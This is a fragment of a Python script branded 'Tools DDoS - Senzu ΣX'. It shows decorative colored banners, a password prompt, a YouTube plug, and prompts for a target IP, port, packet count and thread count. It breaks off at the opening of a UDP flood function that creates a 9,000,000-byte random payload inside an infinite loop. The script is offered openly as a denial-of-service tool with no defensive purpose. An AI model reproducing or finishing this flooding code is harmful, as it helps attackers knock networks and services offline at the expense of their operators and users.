...
time.sleep(1.5)
print("\033[37mWait To Tools DDoS[\033[32m!\033[37m]")
time.sleep(1.5)
os.system("clear")
print("""\033[32m
────────────────────────────────────────
...
""")
time.sleep(1.5)
print("\033[37m         Welcome To Tools DDoS - Senzu ΣX[\033[32m!\033[37m]")
time.sleep(1.5)
password =str(input("\033[37m[!] \033[32mPassword \033[37m: \033[36m [\033[32m!\033[37m]"))
time.sleep(1.5)
os.system("clear")
...
\033[35m╚╝─╚╝─╚╝───╚╝─\033[32m╚╝─╚╩═══╩╝╚═╝
               ...
               \033[35mSubscribe My YouTube \033[37m- Senzu ΣX
...
choice =str(input("\033[35m[\033[37m!\033[35m] Methods \033[35m? \033[32m [\033[32m!\033[37m]"))
ip =str(input("\033[35m[\033[37m!\033[35m] Ip Target ? \033[32m [\033[32m!\033[37m]"))
port =int(input("\033[35m[\033[37m!\033[35m] Port Target ? \033[32m [\033[32m!\033[37m]"))
times =int(input("\033[35m[\033[37m!\033[35m] Packets ? \033[32m [\033[32m!\033[37m]"))
threads =int(input("\033[35m[\033[37m!\033[35m] Threads ? \033[32m [\033[32m!\033[37m]"))
time.sleep(3)
print("\033[37mSuccess [\033[32m!\033[37m]")
os.system("clear")

def udp():
	data = random._urandom(9000000)
	while True:
		try:
